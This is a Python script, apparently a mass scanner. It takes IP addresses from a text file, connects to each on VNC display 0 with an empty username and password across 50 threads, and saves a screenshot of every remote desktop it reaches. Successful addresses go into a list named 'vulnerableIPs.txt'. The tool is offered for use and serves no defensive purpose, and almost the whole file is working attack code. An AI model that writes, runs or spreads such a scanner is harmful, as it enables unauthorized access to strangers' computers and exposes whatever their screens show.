import os
import time
from vncapi import api
import os.path
import threading
from filelock import FileLock
stopThreads = False

def attemptConnect(ips):
     global stopThreads
     for ip in ips:
        if not stopThreads:
            try:
                with open('nonVulnerableIPs.txt') as f: #TODO: remove this O(n^2) check with something linear
                    if ip not in f.read():
                        client = api.connect('{ip}:0'.format(ip=ip),timeout=10, username='', password='')
                        client.captureScreen('screenshot_IP_{ip}.png'.format(ip=ip))
                        print('Got image from {ip}'.format(ip=ip))
                        with FileLock("vulnerableIPs.txt.lock"): #TODO make non vulnernable ips a list of ALL ips checked, so we don't recsan 
                                with open('vulnerableIPs.txt', "a") as file: 
                                    file.write(ip + "\n")
                                    file.close() #TODO: is there even a point to close these?
                    f.close()
            except:
                print('Cant get image from {ip}'.format(ip=ip))
                #TODO add ability to edit "open" to "close" so as to not re-read the line
                with FileLock("nonVulnerableIPs.txt.lock"):
                        with open('nonVulnerableIPs.txt', "a") as file: #TODO make non vulnernable ips a list of ALL ips checked, so we don't recsan 
                            file.write(ip + "\n")
                            file.close()

def createThread(maxThreads, ips):
        currentIndex = 0
        ipThreadGap = len(ips) // maxThreads
        nextIndex = ipThreadGap
        #the index will be the thread number. the list will contain the ips it has to solve
        ips_to_solve = []
        for i in range(0, maxThreads):
            temp = []
            for x in range(currentIndex, nextIndex): #TODO: simplify with a range(0, ipThreadGap) and use current and next within the loop
                temp.append(ips[x])
            ips_to_solve.append(temp)
            currentIndex += ipThreadGap
            nextIndex += ipThreadGap 
        return ips_to_solve

def parseIPs(textfile):
    if os.path.isfile(textfile):
        print('List of ips detected.')
        with open('ips.txt') as f:
            lines = f.readlines()
            ips = []
            for line in lines:
                parsedLine = line.split(" ")
                try:
                    ips.append(parsedLine[3])
                except:
                    print("The following line does not work. Skipping line:")
                    print(line)
                    print("")
            f.close()
            print("Done. Proceeding with screenshotting: ")
    return ips

def main():
    
    maxThreads = 50
    threadRestartTime = 120 #set to super high for no restart
    ip_file = 'ips.txt'
    ips_to_multithread = createThread(maxThreads, parseIPs(ip_file))

    #Due to an issue in the underlying API, all threads must be restarted.
    #This will resolve issues involving Twisted timeout and such, as this API is not meant to be multithreaded
    #Every time Twisted has an error due to connectivity, it will crash the thread. Thus, we must recreate all threads
    
    while True:
        stopThreads = False
        for i in range(0, maxThreads):
            thread = threading.Thread(target=attemptConnect, kwargs={'ips':ips_to_multithread[i]})
            thread.start()
        
        time.sleep(threadRestartTime)
        stopThreads = True
        print("Restarting all threads...")
        time.sleep(2)
                


if __name__ == '__main__':
    #if os.geteuid() != 0:
        #exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")
    main()
